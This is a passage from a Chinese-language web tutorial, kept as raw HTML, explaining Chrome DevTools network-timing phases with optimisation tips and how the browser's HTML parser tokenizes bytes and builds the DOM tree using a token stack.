请求也需要短暂地等待磁盘分配结束。</li>\n</ul>\n<p>等待排队完成之后，就要进入发起连接的状态了。不过在发起连接之前，还有一些原因可能导致连接过程被推迟，这个推迟就表现在面板中的 Stalled 上，它表示停滞的意思。</p>\n<p>这里需要额外说明的是，如果你使用了代理服务器，还会增加一个 Proxy Negotiation 阶段，也就是代理协商阶段，它表示代理服务器连接协商所用的时间，不过在上图中没有体现出来，因为这里我们没有使用代理服务器。</p>\n<p>接下来，就到了 Initial connection/SSL 阶段了，也就是和服务器建立连接的阶段，这包括了建立 TCP 连接所花费的时间；不过如果你使用了 HTTPS 协议，那么还需要一个额外的 SSL 握手时间，这个过程主要是用来协商一些加密信息的。（关于 SSL 协商的详细过程，我们会在 Web 安全模块中介绍。）</p>\n<p>和服务器建立好连接之后，网络进程会准备请求数据，并将其发送给网络，这就是 Request sent 阶段。通常这个阶段非常快，因为只需要把浏览器缓冲区的数据发送出去就结束了，并不需要判断服务器是否接收到了，所以这个时间通常不到 1 毫秒。</p>\n<p>数据发送出去了，接下来就是等待接收服务器第一个字节的数据，这个阶段称为 Waiting (TTFB)，通常也称为“第一字节时间”。 TTFB 是反映服务端响应速度的重要指标，对服务器来说，TTFB 时间越短，就说明服务器响应越快。</p>\n<p>接收到第一个字节之后，进入陆续接收完整数据的阶段，也就是 Content Download 阶段，这意味着从第一字节时间到接收到全部响应数据所用的时间</p>\n<h2 id="优化时间线上耗时项"><a href="#%E4%BC%98%E5%8C%96%E6%97%B6%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%80%97%E6%97%B6%E9%A1%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化时间线上耗时项</h2>\n<p>了解了时间线面板上的各项含义之后，我们就可以根据这个请求的时间线来实现相关的优化操作了。</p>\n<h3 id="排队（queuing）时间过久"><a href="#%E6%8E%92%E9%98%9F%EF%BC%88queuing%EF%BC%89%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>排队（Queuing）时间过久</h3>\n<p>排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，你就可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为域名分片技术。除了域名分片技术外，我个人还建议你把站点升级到 HTTP2，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制了。</p>\n<h3 id="第一字节时间（ttfb）时间过久"><a href="#%E7%AC%AC%E4%B8%80%E5%AD%97%E8%8A%82%E6%97%B6%E9%97%B4%EF%BC%88ttfb%EF%BC%89%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第一字节时间（TTFB）时间过久</h3>\n<p>这可能的原因有如下：</p>\n<ul>\n<li>服务器生成页面数据的时间过久。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户。服务器在处理这个数据的过程中，可能某个环节会出问题。</li>\n<li>网络的原因。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问你的服务器，这样也会拖慢网速。</li>\n<li>发送请求头时带上了多余的用户信息。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。</li>\n</ul>\n<p>对于这三种问题，你要有针对性地出一些解决方案。面对第一种服务器的问题，你可以想办法去提高服务器的处理速度，比如通过增加各种缓存的技术；针对第二种网络问题，你可以使用 CDN 来缓存一些静态文件；至于第三种，你在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息</p>\n<h3 id="content-download-时间过久"><a href="#content-download-%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Content Download 时间过久</h3>\n<p>如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。这时候你就需要减少文件大小，比如压缩、去掉源码中不必要的注释等方法。</p>\n<h2 id="总结"><a href="#%E6%80%BB%E7%BB%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>首先我们简单介绍了 Chrome 开发者工具 10 个基础的面板信息；然后重点剖析了网络面板，再结合之前介绍的网络请求流程来重点分析了网络面板中时间线的各个指标的含义；最后我们还简要分析了时间线中各项指标出现异常的可能原因，并给出了一些优化方案。</p>\n<p>其实通过今天的分析，我们可以得出这样一个结论：如果你要去做一些实践性的项目优化，理解其背后的理论至关重要。因为理论就是一条“线”，它会把各种实践的内容“串”在一起，然后你可以围绕着这条“线”来排查问题</p>\n<h1 id="dom-树：javascript-是如何影响-dom-树构建的"><a href="#dom-%E6%A0%91%EF%BC%9Ajavascript-%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D-dom-%E6%A0%91%E6%9E%84%E5%BB%BA%E7%9A%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DOM 树：JavaScript 是如何影响 DOM 树构建的</h1>\n<p>在上一篇文章中，我们通过开发者工具中的网络面板，介绍了网络请求过程的几种性能指标以及对页面加载的影响。</p>\n<p>而在渲染流水线中，后面的步骤都直接或者间接地依赖于 DOM 结构，所以本文我们就继续沿着网络数据流路径来介绍 DOM 树是怎么生成的。然后再基于 DOM 树的解析流程介绍两块内容：第一个是在解析过程中遇到 JavaScript 脚本，DOM 解析器是如何处理的？第二个是 DOM 解析器是如何处理跨站点资源的？</p>\n<h2 id="什么是-dom"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-dom" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 DOM</h2>\n<p>从网络传给渲染引擎的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 提供了对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用</p>\n<ul>\n<li>从页面的视角来看，DOM 是生成页面的基础数据结构。</li>\n<li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。</li>\n<li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。</li>\n</ul>\n<p>简言之，DOM 是表述 HTML 的内部数据结构，它会将 Web 页面和 JavaScript 脚本连接起来，并过滤一些不安全的内容。</p>\n<h2 id="dom-树如何生成"><a href="#dom-%E6%A0%91%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DOM 树如何生成</h2>\n<p>在渲染引擎内部，有一个叫 HTML 解析器（HTMLParser）的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。所以这里我们需要先要搞清楚 HTML 解析器是怎么工作的。</p>\n<p>在开始介绍 HTML 解析器之前，我要先解释一个大家在留言区问到过好多次的问题：HTML 解析器是等整个 HTML 文档加载完成之后开始解析的，还是随着 HTML 文档边加载边解析的？</p>\n<p>在这里我统一解答下，HTML 解析器并不是等整个文档加载完成之后再解析的，而是网络进程加载了多少数据，HTML 解析器便解析多少数据。</p>\n<p>那详细的流程是怎样的呢？网络进程接收到响应头之后，会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text/html”，那么浏览器就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。渲染进程准备好之后，网络进程和渲染进程之间会建立一个共享数据的管道，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据“喂”给 HTML 解析器。你可以把这个管道想象成一个“水管”，网络进程接收到的字节流像水一样倒进这个“水管”，而“水管”的另外一端是渲染进程的 HTML 解析器，它会动态接收字节流，并将其解析为 DOM。</p>\n<p>解答完这个问题之后，接下来我们就可以来详细聊聊 DOM 的具体生成流程了。</p>\n<p>前面我们说过代码从网络传输过来是字节流的形式，那么后续字节流是如何转换为 DOM 的呢？你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-62f9e.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 57.86736020806242%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABn0lEQVQoz6WRy07CUBCG+yisjIlv4JP4EO5cGbeuTNxoYqImaEQTTAwGU8CKpkirICFCUu7KpUIKFNrSSiltT3s8tooX1I2TybnON/+cMxj8h2G2bZ8yve3b5naCK3aGUBYh16r31f10d5duxB4EaAHjiYXK4LLE7yRaR2lOGY0RadsQAwAsnLCz65mZjdJxrAwzSSsUCN/V5jYLntWbJbwBa+UhETJpcvGs5lm7n99imv1nB7YxNCWqQiD1eFHkm5KGFJDzQ50s81elbr4tI2XAd6Gh5ziFuM7SdUkzzFcYlc1xXDadKjLZxkOxkGMGsuxm/fI4d9tuQSoKxd7kBGMYxuvdi8cpiqaRi4Lgwpbjb1mc0RpIajQCFPkDZlk2GAziOB4Oh2kEi+I3ZXdlmGDlvL5wmF+O1IBlvf12tVr1+XwIJgiCJMlp2DVg2aFC/yDdxvN96/0Wq1Qqfr+foqhkMvlZeZr/oc+qqnY6nZ5jPM8bhvFbKBIEzkd8wNNBqPOyLEuShPJqmvaX8qTISaloHI/Ho9FI13XTNP+AXwDEnpYxybov0wAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 24 58"\n        title=""\n        src="/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-fee1c.png"\n        srcset="/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-a67b7.png 200w,\n/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-0b187.png 400w,\n/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-fee1c.png 800w,\n/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-b1a91.png 1200w,\n/static/2021-07-12-09-24-58-90e4c67092638cfcc2717bac6051f26d-62f9e.png 1538w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中你可以看出，字节流转换为 DOM 需要三个阶段。</p>\n<p>第一个阶段，通过分词器将字节流转换为 Token。</p>\n<p>前面文章中我们介绍过，V8 编译 JavaScript 过程中的第一步是做词法分析，将 JavaScript 先分解为一个个 Token。解析 HTML 也是一样的，需要通过分词器先将字节流转换为一个个 Token，分为 Tag Token 和文本 Token。上述 HTML 代码通过词法分析生成的 Token 如下所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-4f503.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 23.578363384188627%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA8UlEQVQY02P4+/ff77///oDI/3/+/v8N4QIF/vz5/+cPVPYfiP73BygMEgTxgIx//xjmnH5tP/Nq3a7H4UtulG29H7fqbuCiG12XW06taH3SUD1tyznX+U86jqxecrnsVnf77bbG6001t7tbrlYWvdq7i+Hooy89Bx5tvvFx9rHH6668WXD2zcwTL3c93fHo7M73WzYdvvp00vEPu+5fOPV83cvdO17v2Pp48/qXu7Y9Xrfy881rDP9xgH8w9P//HyiNARiAwn/+/fv7D0j+h5BAka/fv7558+bzp0+fP3958er1l69fQMb9/fsfGf37BwCOuAfq0ZVGxAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 25 24"\n        title=""\n        src="/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-fee1c.png"\n        srcset="/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-a67b7.png 200w,\n/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-0b187.png 400w,\n/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-fee1c.png 800w,\n/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-b1a91.png 1200w,\n/static/2021-07-12-09-25-24-a8c6d786f6a21428c2e65dec85082976-4f503.png 1442w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>由图可以看出，Tag Token 又分 StartTag 和 EndTag，分别对应图中的蓝色和红色块，文本 Token 对应的绿色块。至于后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。</p>\n<blockquote>\n<p>HTML 解析器维护了一个 Token 栈结构，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：</p>\n</blockquote>\n<ul>\n<li>如果压入到栈中的是 StartTag Token，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。</li>\n<li>如果分词器解析出来是文本 Token，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。</li>\n<li>如果分词器解析出来的是 EndTag 标签，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StartTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。</li>\n</ul>\n<p>通过分词器产生的新 Token 就这样不停地压栈和出栈，整个解析过程就这样一直持续下去，直到分词器将所有字节流分词完成。</p>\n<p>为了更加直观地理解整个过程，下面我们结合一段 HTML 代码（如下），来一步步分析 DOM 树的生成过程。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="75543338768974900000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <body>\n    <div>1</div>\n    <div>test</div>\n  </body>\n</html>`, `75543338768974900000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这段代码以字节流的形式传给了 HTML 解析器，经过分词器处理，解析出来的第一个 Token 是 StartTag html，解析出来的 Token 会被压入到栈中，并同时创建一个 html 的 DOM 节点，将其加入到 DOM 树中。</p>\n<p>这里需要补充说明下，HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构，同时会将一个 StartTag document 的 Token 压入栈底。然后经过分词器解析出来的第一个 StartTag html Token 会被压入到栈中，并创建一个 html 的 DOM 节点，添加到 document 上，如下图所示</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-b1ea5.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 74.76489028213166%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABhklEQVQoz5VTuU7DQBD1L9FDS0/JF1BQI/EPUEQgJBBIUKBQQ4uIhAQEAV2Q5ShEDhS+4/i+d83LrhORmCuvsGbezJvZ2VkLJQMhJGcoiqKcADYnCQFJWFbFAJRSgec5juN5XhiGo9EoyzJO2rbten6RhO2uudEcbDbl1qsBNwjGaXEcj8Wo4fs+vrCjKErTlItRjjCyb8b7LeXwVhG1hIeSJKnEOE1dDBdixpVGQE7a9nHbUdxiXvxr57Eh28X2lbp1qXaNbEZsWZYoihiPsxDjMlzXlSQJofIHVGL0MU3TD4K8IOgThlGWphgEYZSYZlOGeTGbmQZBwGNJPHPsPzrzarI6ung2z5+sx55F8uy/Yn4l993h8t5gaeetcaOWNKMLiV/6w/VTee2od3anlGRB8YOkrzY6K7udg+t+SXM6eXb0OyAUM1QzDx1PHBjiu/Wh25QSXh7L9xh8Bu8LUBcbFepH4v8DtjVtBQZuPVOYrLFEbsFmwNvQdR218fpdBk3TYNfFn/RBXAbID3gEAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 45 57"\n        title=""\n        src="/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-fee1c.png"\n        srcset="/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-a67b7.png 200w,\n/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-0b187.png 400w,\n/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-fee1c.png 800w,\n/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-b1a91.png 1200w,\n/static/2021-07-12-09-45-57-ec38c87f5c2f77e9752986c05bb4f70d-b1ea5.png 1276w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>然后按照同样的流程解析出来 StartTag body 和 StartTag div，其 Token 栈和 DOM 的状态如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-24e6c.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 74.13533834586467%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB4UlEQVQoz6VTv0/bQBTmr6JTJQa6sbVqUZe0AzMDe7dKHWgodKoKiMDAQjsUhJCiSoiNBUEjIdokipz4R2zH5/jOduw735nnOzdAE6Z+ks9Pd9/3vvfOzzP5f2BGvTjnGOMoimBNkkRtjkYjQkgYhrCQMCZhFEoALQgCkJRiSinIlACO1SbspJTlufhx6b78+vvtbqvnxWCUcQ5ixthfcZpCQghSSuMYGLkQAmxhhbjr06PGsH6DY8oVHwyyLCvFkEYZJimNZJaSwQvxpcmW9vV3xzZJxfiodDZMi3j21pnxuqatHHTcIWQRhmnatq2oms+2z4PvVzhhE2LbGUSetfrTfbKhv6qZNipKcAcDx3GkcX7eTV9sdpa/mUEyIZaMrFrvza3/qey0bERkzwVD9TwM00Yv0BBVXUwRr9X1+fWbN7V23yNyUwS4CPYu4oVNq3oWyoTyeSCWV/b+xJr91H2+pRkDrJwxAbHoIHbajBoWVVWIfJr4Y11/9rlZqbVNryx7/Kkm8W/ZHw6bT6vXi19+GW5QOmPMCwiWCeh2DDiFvHdDkguuO6hloLaB4lE5njCnoFcTKof0Dg/G8z4gN2SFAYKg8BVCxY/+GOp6uaRQyvr9PkJoKAHm8MF9358U3wI6Wk1a/8IQXAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 09 46 10"\n        title=""\n        src="/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-fee1c.png"\n        srcset="/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-a67b7.png 200w,\n/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-0b187.png 400w,\n/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-fee1c.png 800w,\n/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-b1a91.png 1200w,\n/static/2021-07-12-09-46-10-afc78975320d5dacdb2f173c2e9bc4e4-24e6c.png 1330w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>接下来解析出来的是第一个 div 的文本 Token，渲染引擎会为该 Token 创建一个文本节点，并将该 Token 添加到 DOM 中，它的父节点就是当前 Token 栈顶元素对应的节点，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-09-46-25-e5fd6fa68ed8a69bd7591513d852d088-21e31.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 71.01865136298422%; position: relative; bottom: 0; left: 0; background-image: 